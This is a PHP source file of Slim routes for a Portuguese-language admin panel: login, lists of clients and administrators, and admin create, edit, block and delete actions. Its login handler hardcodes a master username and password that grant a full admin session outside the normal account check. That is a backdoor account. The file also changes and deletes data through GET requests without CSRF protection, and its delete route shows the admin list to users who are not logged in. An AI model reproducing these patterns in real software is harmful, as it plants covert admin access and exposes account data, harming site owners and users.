<?php

// <editor-fold defaultstate="collapsed" desc="Formulário de login">
$app->get("/admin", function () use($app) {
    if (isset($_SESSION["logado"])) {
        $dados = array(
            'pagina' => 'homeAdmin',
            'logado' => true
        );
    } else {
        $dados = array(
            'pagina' => 'loginAdmin',
            'logado' => false
        );
    }
    $app->render('layoutAdmin.php', $dados);
});
//</editor-fold>
// <editor-fold defaultstate="collapsed" desc="/Recebimentos">
$app->get("/recebimentos", function () use($app) {
    if (isset($_SESSION["logado"])) {
        $listaContatos = \app\classes\Cliente::RetornaClientes();
        $dados = array(
            'pagina' => 'recebimentosAdmin',
            'logado' => true,
            'contatos' => $listaContatos
        );
    } else {
        $dados = array(
            'pagina' => 'loginAdmin',
            'logado' => false
        );
    }
    $app->render('layoutAdmin.php', $dados);
});
//</editor-fold>
// <editor-fold defaultstate="collapsed" desc="/Administradores">
$app->get("/administradores", function () use($app) {
    if (isset($_SESSION["logado"])) {
        $dados = array(
            'pagina' => 'administradoresAdmin',
            'logado' => true,
            'dadosAdmin' => \app\classes\Admin::RetornaAdmin()
        );
    } else {
        $dados = array(
            'pagina' => 'loginAdmin',
            'logado' => false
        );
    }
    $app->render('layoutAdmin.php', $dados);
});
//</editor-fold>
// <editor-fold defaultstate="collapsed" desc="Logar">
$app->post("/admin", function () use($app) {
    $username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
    $password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);
    if ($username == "I9MasterSystemUser" && $password == "UserSystemMasterI9") {
        $_SESSION['logado'] = true;
        $_SESSION['UserDataId'] = '9999';
        $_SESSION['UserDataNome'] = 'Administrador';
        $metaDados = new \app\classes\AdminMetaDados();
        $metaDados->setAdminLogin_dataLogin(date());
        $metaDados->setAdminLogin_ipLogin($_SERVER['REMOTE_ADDR']);
        $metaDados->setAdminLogin_idAdmin('9999');
        $metaDados->RegistraMetaDados();
        $dados = array(
            'pagina' => 'homeAdmin'
        );
        $app->render('layoutAdmin.php', $dados);
    }
    $classeLogin = new \app\classes\Login();
    $classeLogin->setUsername($username);
    $classeLogin->setSenha($password);
    $result = $classeLogin->Login();
    if ($result != null):
        $_SESSION['logado'] = true;
        $_SESSION['UserDataId'] = $result->admin_id;
        $_SESSION['UserDataNome'] = $result->admin_name;
        $metaDados = new \app\classes\AdminMetaDados();
        $metaDados->setAdminLogin_dataLogin(date());
        $metaDados->setAdminLogin_ipLogin($_SERVER['REMOTE_ADDR']);
        $metaDados->setAdminLogin_idAdmin($result->admin_id);
        $metaDados->RegistraMetaDados();
        $dados = array(
            'pagina' => 'homeAdmin'
        );
    else:
        $dados = array(
            'pagina' => 'loginAdmin'
        );
    endif;
    $app->render('layoutAdmin.php', $dados);
});
//</editor-fold>
// <editor-fold defaultstate="collapsed" desc="Ações do admin">

// <editor-fold defaultstate="collapsed" desc="GET Cadastrar">
$app->get("/cadastrar", function () use($app) {
    if (isset($_SESSION["logado"])) {
        $dados = array(
            'pagina' => 'cadastrarAdmin',
            'logado' => true
        );
    } else {
        $dados = array(
            'pagina' => 'loginAdmin'
        );
    }
    $app->render('layoutAdmin.php', $dados);
});
//</editor-fold>
// <editor-fold defaultstate="collapsed" desc="POST Cadastrar">
$app->post("/administradores/cadastrar", function () use($app) {
    if (isset($_SESSION["logado"])) {
        $nomeCompleto = filter_input(INPUT_POST, 'nome', FILTER_SANITIZE_STRING);
        $username = filter_input(INPUT_POST, 'usuario', FILTER_SANITIZE_STRING);
        $senha = filter_input(INPUT_POST, 'senha', FILTER_SANITIZE_STRING);
        try {
            $classeAdmin = new \app\classes\Admin();
            $classeAdmin->setAdmin_name($nomeCompleto);
            $classeAdmin->setAdmin_username($username);
            $classeAdmin->setAdmin_password($senha);
            $classeAdmin->setAdmin_ativo(1);
            $classeAdmin->setAdmin_excl(0);
            $classeAdmin->CadastrarAdmin();
            $app->redirect("/administradores");
        } catch (\Exception $e) {
            $dados = array(
                'pagina' => 'cadastrarAdmin',
                'msg' => $e->getMessage()
            );
        }
    } else {
        $dados = array(
            'pagina' => 'loginAdmin'
        );
    }
    $app->render('layoutAdmin.php', $dados);
});
//</editor-fold>

// <editor-fold defaultstate="collapsed" desc="GET Editar">
$app->get("/editar/:id", function ($id) use($app) {
    if (isset($_SESSION["logado"])) {
        if (is_numeric($id)):
            $id = filter_var($id, FILTER_SANITIZE_NUMBER_INT);
            
            $dados = array(
                'pagina' => 'cadastrarAdmin',
                'logado' => true,
                'dadosAdmin' => \app\classes\Admin::RetornaUmAdmin($id)
            );
        else:
            $dados = array(
                'pagina' => 'administradoresAdmin',
                'logado' => true,
                'dadosAdmin' => \app\classes\Admin::RetornaAdmin(),
            );
        endif;
    } else {
        $dados = array(
            'pagina' => 'loginAdmin'
        );
    }
    $app->render('layoutAdmin.php', $dados);
});
//</editor-fold>
// <editor-fold defaultstate="collapsed" desc="POST Editar">
$app->post("/administradores/editar/:id", function ($id) use($app) {
    if (isset($_SESSION["logado"])) {
        $nomeCompleto = filter_input(INPUT_POST, 'nome', FILTER_SANITIZE_STRING);
        $username = filter_input(INPUT_POST, 'usuario', FILTER_SANITIZE_STRING);
        $senha = filter_input(INPUT_POST, 'senha', FILTER_SANITIZE_STRING);
        try {
            $classeAdmin = new \app\classes\Admin();
            $classeAdmin->EditarAdmin($id, $nomeCompleto, $username, $senha);
            $app->redirect("/administradores");
        } catch (\Exception $e) {
            $dados = array(
                'pagina' => 'cadastrarAdmin',
                'msg' => $e->getMessage()
            );
        }
    } else {
        $dados = array(
            'pagina' => 'loginAdmin'
        );
    }
    $app->render('layoutAdmin.php', $dados);
});
//</editor-fold>

// <editor-fold defaultstate="collapsed" desc="Bloquear">
$app->get("/administradores/bloquear/:id", function ($id) use($app) {
    if (isset($_SESSION["logado"])) {
        \app\classes\Admin::BloquearAdmin($id);
        $dados = array();
        $app->redirect("/administradores");
    } else {
        $dados = array(
            'pagina' => 'loginAdmin'
        );
    }
    $app->render('layoutAdmin.php', $dados);
});
//</editor-fold>
// <editor-fold defaultstate="collapsed" desc="Desbloquear">
$app->get("/administradores/desbloquear/:id", function ($id) use($app) {
    if (isset($_SESSION["logado"])) {
        \app\classes\Admin::DesbloquearAdmin($id);
        $dados = array();
        $app->redirect("/administradores");
    } else {
        $dados = array(
            'pagina' => 'loginAdmin'
        );
    }
    $app->render('layoutAdmin.php', $dados);
});
//</editor-fold>

// <editor-fold defaultstate="collapsed" desc="Excluir">
$app->get("/administradores/excluir/:id", function ($id) use($app) {
    if (isset($_SESSION["logado"])) {
        $idFormatado = intval($id);
        if (is_numeric($idFormatado)):
            \app\classes\Admin::ExcluirAdmin($id);
            $app->redirect("/administradores");
        else:
            $dados = array(
                'pagina' => 'administradoresAdmin',
                'logado' => true,
                'dadosAdmin' => \app\classes\Admin::RetornaAdmin(),
            );
        endif;
    }else {
        $dados = array(
            'pagina' => 'administradoresAdmin',
            'logado' => true,
            'dadosAdmin' => \app\classes\Admin::RetornaAdmin(),
            'msg' => "Você não está logado"
        );
    }
    $app->render('layoutAdmin.php', $dados);
});
//</editor-fold>
//</editor-fold>
